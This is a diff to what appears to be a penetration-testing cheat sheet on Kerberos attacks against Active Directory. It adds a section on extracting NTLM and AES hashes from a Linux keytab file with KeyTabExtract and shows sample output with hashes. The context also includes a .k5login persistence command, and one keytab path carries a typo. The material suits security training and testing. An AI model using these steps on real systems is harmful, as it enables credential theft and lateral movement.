@@ -1,7 +1,7 @@
 ---
 title: "Kerberos"
-date: 2024-7-2
-tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows"]
+date: 2025-8-4
+tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Cracking", "Sliver", "Enumeration", "Ntlm", "Smb", "Kerbrute", "Pass-The-Hash", "Impacket", "Ticket Granting Ticket", "Domain Controller", "Active Directory", "Windows", "krb5", "Keytab"]
 ---
 
 ### Users Enum
@@ -576,7 +576,7 @@ Cached Tickets: (1)
 {{< tab set6 tab2 >}}wmiexec{{< /tab >}}
 {{< tabcontent set6 tab1 >}}
 
-#### 1. Config /etc/krb5.conf
+#### 1. Config '/etc/krb5.conf'
 
 ```console
 # In UPPER case
@@ -673,3 +673,32 @@ Type help for list of commands
 ```console
 echo '<USER>@<DOMAIN>' > /home/<TARGET_USER>/.k5login
 ```
+
+---
+
+### Extract NTLM from Keytab
+
+```console
+# Check
+cat /etc/ktb5.keytab | base64 -w0
+```
+
+```console
+# Extract
+python3 keytabextract.py krb5.keytab 
+```
+
+```console {class="sample-code"}
+$ python3 keytabextract.py krb5.keytab
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+        REALM : EXAMPLE.COM
+        SERVICE PRINCIPAL : MAIL01$/
+        NTLM HASH : 0f916c5246fdbc7ba95dcef4126d57bd
+        AES-256 HASH : eac6b4f4639b96af4f6fc2368570cde71e9841f2b3e3402350d3b6272e436d6e
+        AES-128 HASH : 3a732454c95bcef529167b6bea476458
+```
+
+<small>*Ref: [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)*</small>
